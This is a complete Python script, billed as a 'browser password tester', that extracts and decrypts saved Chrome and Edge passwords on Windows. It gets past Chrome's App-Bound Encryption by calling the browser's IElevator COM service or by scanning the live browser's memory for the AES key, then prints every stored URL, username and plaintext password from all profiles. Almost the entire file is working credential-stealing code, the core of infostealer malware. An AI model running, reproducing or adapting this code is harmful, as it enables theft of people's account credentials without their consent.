"""
Standalone browser password tester — handles v10/v11 (Chrome <127) and
v20 (Chrome 127+ App-Bound Encryption).

Key methods tried in order for v20:
  1. IElevator COM     — Chrome 127-129
  2. Process memory scan — Chrome 130+ (browser must be running)

Requires: pip install pycryptodome pywin32 psutil
"""
import base64, ctypes, json, os, shutil, sqlite3, struct, tempfile

_LOCAL = os.environ.get("LOCALAPPDATA", "")
_BROWSERS = {
    "Chrome": (os.path.join(_LOCAL, r"Google\Chrome\User Data"), "chrome"),
    "Edge":   (os.path.join(_LOCAL, r"Microsoft\Edge\User Data"), "msedge"),
}

# ── IElevator COM ─────────────────────────────────────────────────────────────

_ole32    = ctypes.WinDLL("ole32")
_oleaut32 = ctypes.WinDLL("oleaut32")
_kernel32 = ctypes.WinDLL("kernel32")

_ole32.CoInitializeEx.restype    = ctypes.HRESULT
_ole32.CoInitializeEx.argtypes   = [ctypes.c_void_p, ctypes.c_ulong]
_ole32.CLSIDFromString.restype   = ctypes.HRESULT
_ole32.CLSIDFromString.argtypes  = [ctypes.c_wchar_p, ctypes.c_void_p]
_ole32.CoCreateInstance.restype  = ctypes.HRESULT
_ole32.CoCreateInstance.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                     ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
_oleaut32.SysAllocStringByteLen.restype  = ctypes.c_void_p
_oleaut32.SysAllocStringByteLen.argtypes = [ctypes.c_char_p, ctypes.c_uint]
_oleaut32.SysFreeString.restype  = None
_oleaut32.SysFreeString.argtypes = [ctypes.c_void_p]
_oleaut32.SysStringByteLen.restype  = ctypes.c_uint
_oleaut32.SysStringByteLen.argtypes = [ctypes.c_void_p]

_CLSCTX_LOCAL_SVR = 4
_S_OK             = 0
_ELEVATOR_IID     = "{463ABECF-9555-4147-9990-E7BC564875F1}"

_ELEVATOR_CLSIDS = {
    "Chrome": [
        "{708860E0-F641-4611-8895-7D867DD3675B}",
        "{DD2CCCFB-8EEF-4A58-9891-B7AB9B1F7BF0}",
        "{DA0B63A9-4E21-4A0E-9A61-F19F48F84F3E}",
        "{47E5FC5E-F22F-4FCF-9DFB-B10CCDD7EF3D}",
    ],
    "Edge": [
        "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
        "{DDC0BC04-B7F8-4E8E-AA08-B02EBEBCABD5}",
    ],
}
_ELEVATOR_IIDS = {
    "Chrome": [_ELEVATOR_IID],
    "Edge":   ["{A779D01E-B099-4081-A7B3-A0F41FA4A3C0}", _ELEVATOR_IID],
}


def _guid_buf(s):
    buf = (ctypes.c_byte * 16)()
    _ole32.CLSIDFromString(s, ctypes.byref(buf))
    return buf


def _ielevator_decrypt(clsid_str, iid_str, blob):
    try: _ole32.CoInitializeEx(None, 0)
    except: pass
    clsid = _guid_buf(clsid_str)
    iid   = _guid_buf(iid_str)
    ppv   = ctypes.c_void_p()
    try:
        hr = _ole32.CoCreateInstance(ctypes.byref(clsid), None, _CLSCTX_LOCAL_SVR,
                                      ctypes.byref(iid), ctypes.byref(ppv))
    except OSError:
        return None
    if hr != _S_OK or not ppv.value:
        return None
    vtbl   = ctypes.cast(ppv.value, ctypes.POINTER(ctypes.POINTER(ctypes.c_size_t)))
    result = None
    try:
        DecryptData = ctypes.WINFUNCTYPE(
            ctypes.HRESULT, ctypes.c_void_p, ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_ulong),
        )(vtbl[0][8])
        in_bstr  = _oleaut32.SysAllocStringByteLen(blob, len(blob))
        out_bstr = ctypes.c_void_p()
        last_err = ctypes.c_ulong(0)
        hr2 = DecryptData(ppv, in_bstr, ctypes.byref(out_bstr), ctypes.byref(last_err))
        _oleaut32.SysFreeString(in_bstr)
        if hr2 == _S_OK and out_bstr.value:
            n = _oleaut32.SysStringByteLen(out_bstr.value)
            result = (ctypes.c_char * n).from_address(out_bstr.value).raw
            _oleaut32.SysFreeString(out_bstr.value)
    except Exception:
        pass
    finally:
        try:
            ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(vtbl[0][2])(ppv)
        except: pass
    return result


# ── Process memory scan ───────────────────────────────────────────────────────

_PTR = ctypes.sizeof(ctypes.c_void_p)
if _PTR == 8:
    _MBI_SIZE, _OFF_RGNSZ, _OFF_STATE, _OFF_PROTECT, _OFF_TYPE = 48, 24, 32, 36, 40
    _RGNSZ_FMT, _USER_MAX = "<Q", (1 << 47) - 1
else:
    _MBI_SIZE, _OFF_RGNSZ, _OFF_STATE, _OFF_PROTECT, _OFF_TYPE = 28, 12, 16, 20, 24
    _RGNSZ_FMT, _USER_MAX = "<I", 0x7FFFFFFF

_kernel32.OpenProcess.restype    = ctypes.c_void_p
_kernel32.OpenProcess.argtypes   = [ctypes.c_ulong, ctypes.c_bool, ctypes.c_ulong]
_kernel32.CloseHandle.restype    = ctypes.c_bool
_kernel32.CloseHandle.argtypes   = [ctypes.c_void_p]
_kernel32.VirtualQueryEx.restype  = ctypes.c_size_t
_kernel32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                      ctypes.c_void_p, ctypes.c_size_t]
_kernel32.ReadProcessMemory.restype  = ctypes.c_bool
_kernel32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                         ctypes.c_void_p, ctypes.c_size_t,
                                         ctypes.POINTER(ctypes.c_size_t)]

_MEM_COMMIT, _MEM_PRIVATE = 0x1000, 0x20000
_PAGE_NOACCESS, _PAGE_GUARD = 0x01, 0x100
_MAX_REGION = 2 * 1024 * 1024


def _scan_pid(pid, iv, enc, tag):
    from Crypto.Cipher import AES
    h = _kernel32.OpenProcess(0x0010 | 0x0400, False, pid)
    if not h:
        return None
    mbi = (ctypes.c_char * _MBI_SIZE)()
    try:
        addr = 0
        while addr < _USER_MAX:
            if not _kernel32.VirtualQueryEx(h, ctypes.c_void_p(addr), mbi, _MBI_SIZE):
                break
            rgnsz   = struct.unpack_from(_RGNSZ_FMT, mbi, _OFF_RGNSZ)[0]
            state   = struct.unpack_from("<I",        mbi, _OFF_STATE)[0]
            protect = struct.unpack_from("<I",        mbi, _OFF_PROTECT)[0]
            mtype   = struct.unpack_from("<I",        mbi, _OFF_TYPE)[0]
            if (state == _MEM_COMMIT and mtype == _MEM_PRIVATE
                    and not (protect & (_PAGE_NOACCESS | _PAGE_GUARD))
                    and 32 <= rgnsz <= _MAX_REGION):
                buf = (ctypes.c_char * rgnsz)()
                nrd = ctypes.c_size_t(0)
                if _kernel32.ReadProcessMemory(h, ctypes.c_void_p(addr),
                                               buf, rgnsz, ctypes.byref(nrd)):
                    chunk = bytes(buf[:nrd.value])
                    for i in range(0, len(chunk) - 32, 4):
                        candidate = chunk[i:i + 32]
                        try:
                            AES.new(candidate, AES.MODE_GCM, iv).decrypt_and_verify(enc, tag)
                            return candidate
                        except Exception:
                            pass
            addr += rgnsz
    finally:
        _kernel32.CloseHandle(h)
    return None


def _memory_scan(proc_name, test_blob):
    """Scan all running browser processes for the live AES key."""
    if not test_blob or test_blob[:3] not in (b"v10", b"v11", b"v20"):
        return None
    iv  = test_blob[3:15]
    enc = test_blob[15:-16]
    tag = test_blob[-16:]
    if len(enc) < 1:
        return None
    try:
        import psutil
    except ImportError:
        print("  [memory scan needs: pip install psutil]")
        return None
    target = proc_name.lower().replace(".exe", "")
    print(f"  Scanning {target} processes...")
    found = 0
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            if proc.info["name"].lower().replace(".exe", "") != target:
                continue
            found += 1
            key = _scan_pid(proc.info["pid"], iv, enc, tag)
            if key:
                return key
        except Exception:
            continue
    if found == 0:
        print(f"  No {target} processes found — open the browser first")
    return None


# ── Key extraction ────────────────────────────────────────────────────────────

def _get_test_blob(user_data):
    for profile in ["Default"] + [f"Profile {i}" for i in range(1, 20)]:
        db = os.path.join(user_data, profile, "Login Data")
        if not os.path.isfile(db):
            continue
        tmp = tempfile.mktemp(suffix=".db")
        shutil.copy2(db, tmp)
        try:
            con  = sqlite3.connect(tmp)
            rows = con.execute("SELECT password_value FROM logins LIMIT 20").fetchall()
            con.close()
        except Exception:
            continue
        finally:
            try: os.remove(tmp)
            except: pass
        for (pw,) in rows:
            if pw and bytes(pw)[:3] in (b"v10", b"v11", b"v20"):
                return bytes(pw)
    return None


def _get_keys(local_state_path, browser, user_data, proc_name):
    with open(local_state_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    os_crypt = data.get("os_crypt", {})

    # ── v10 key via DPAPI ─────────────────────────────────────────────────────
    v10_key = None
    try:
        import win32crypt
        blob    = base64.b64decode(os_crypt["encrypted_key"])[5:]
        v10_key = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
        print(f"  v10 key (DPAPI): {v10_key.hex()}")
    except Exception as e:
        print(f"  v10 key FAIL: {e}")

    # ── v20 key ───────────────────────────────────────────────────────────────
    v20_key = None
    abe_b64 = os_crypt.get("app_bound_encrypted_key", "")
    if abe_b64:
        abe_blob = base64.b64decode(abe_b64)
        print(f"  app_bound_encrypted_key: {len(abe_blob)} bytes")

        # Method 1: IElevator COM (Chrome 127-129)
        print("  [1] Trying IElevator COM...")
        for clsid in _ELEVATOR_CLSIDS.get(browser, []):
            for iid in _ELEVATOR_IIDS.get(browser, [_ELEVATOR_IID]):
                raw = _ielevator_decrypt(clsid, iid, abe_blob)
                if raw and len(raw) >= 32:
                    v20_key = raw[-32:]
                    print(f"  v20 key (IElevator): {v20_key.hex()}")
                    break
            if v20_key:
                break

        # Method 2: memory scan (Chrome 130+)
        if not v20_key:
            print("  [2] IElevator blocked — trying memory scan (Chrome 130+)...")
            test_blob = _get_test_blob(user_data)
            if test_blob and test_blob[:3] == b"v20":
                v20_key = _memory_scan(proc_name, test_blob)
                if v20_key:
                    print(f"  v20 key (memory): {v20_key.hex()}")
                else:
                    print("  memory scan: key not found")
            else:
                print("  no v20 test blob available for memory scan")
    else:
        print("  No app_bound_encrypted_key — browser may be pre-127")

    return v10_key, v20_key


# ── Decrypt one password blob ─────────────────────────────────────────────────

def _decrypt(blob, v10_key, v20_key):
    if not blob:
        return ""
    b = bytes(blob)
    prefix = b[:3]

    if prefix in (b"v10", b"v11"):
        if not v10_key:
            return "[no v10 key]"
        from Crypto.Cipher import AES
        try:
            return AES.new(v10_key, AES.MODE_GCM, b[3:15]).decrypt_and_verify(
                b[15:-16], b[-16:]
            ).decode("utf-8", errors="replace")
        except Exception as e:
            return f"[v10 AES-GCM failed: {e}]"

    if prefix == b"v20":
        if not v20_key:
            return "[no v20 key — open browser and retry]"
        from Crypto.Cipher import AES
        try:
            return AES.new(v20_key, AES.MODE_GCM, b[3:15]).decrypt_and_verify(
                b[15:-16], b[-16:]
            ).decode("utf-8", errors="replace")
        except Exception as e:
            return f"[v20 AES-GCM failed: {e}]"

    try:
        import win32crypt
        return win32crypt.CryptUnprotectData(b, None, None, None, 0)[1].decode("utf-8", errors="replace")
    except Exception as e:
        return f"[DPAPI failed: {e}]"


# ── Main ──────────────────────────────────────────────────────────────────────

for browser, (user_data, proc_name) in _BROWSERS.items():
    if not os.path.isdir(user_data):
        continue
    local_state = os.path.join(user_data, "Local State")
    if not os.path.isfile(local_state):
        continue

    print(f"\n{'='*50}\n {browser}\n{'='*50}")
    v10_key, v20_key = _get_keys(local_state, browser, user_data, proc_name)

    for profile in ["Default"] + [f"Profile {i}" for i in range(1, 20)]:
        db = os.path.join(user_data, profile, "Login Data")
        if not os.path.isfile(db):
            continue
        tmp = tempfile.mktemp(suffix=".db")
        shutil.copy2(db, tmp)
        try:
            con  = sqlite3.connect(tmp)
            rows = con.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            ).fetchall()
            con.close()
        except Exception as e:
            print(f"  [{profile}] DB error: {e}")
            os.remove(tmp)
            continue
        os.remove(tmp)

        entries = [(url, usr, _decrypt(pw, v10_key, v20_key)) for url, usr, pw in rows if url or usr]
        if not entries:
            continue
        print(f"\n  [{profile}] — {len(entries)} entries")
        for url, usr, pw in entries:
            print(f"    {url}")
            print(f"      user: {usr}")
            print(f"      pass: {pw}")
